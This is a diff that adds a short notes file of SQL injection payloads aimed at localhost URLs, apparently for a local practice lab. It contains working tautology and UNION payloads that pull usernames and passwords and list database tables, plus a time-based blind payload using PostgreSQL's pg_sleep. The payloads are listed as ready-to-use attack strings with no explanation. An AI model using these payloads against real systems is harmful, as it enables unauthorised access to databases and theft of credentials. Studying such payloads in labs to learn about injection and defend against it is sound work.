@@ -1,0 +1,19 @@
+blind:
+
+Get all entries in the table:
+http://localhost:8000/ib/?id=1+or+1=1
+
+Union to table with users and passwords:
+http://localhost:8000/ib/?id=1+union+select+1,username,password+from+blind 
+
+Union to get all tables in the database:
+http://localhost:8000/ib/?id=1+union+SELECT+null,null,table_name+FROM%20information_schema.tables+WHERE%20table_type+%3d+%27BASE%20TABLE%27+AND%20table_schema=%27public%27
+
+time based:
+
+
+Trigger wait:
+http://localhost:8000/tblind/?id=1+and+strpos%28%28SELECT%20CASE%20WHEN%201%3D1%20THEN%20pg%5Fsleep%2810%29%20ELSE%20pg%5Fsleep%280%29%20END%29%3A%3Atext%2C%20%271%27%29%20%3E%200
+
+strpos((SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END)::text, '1') > 0 
+
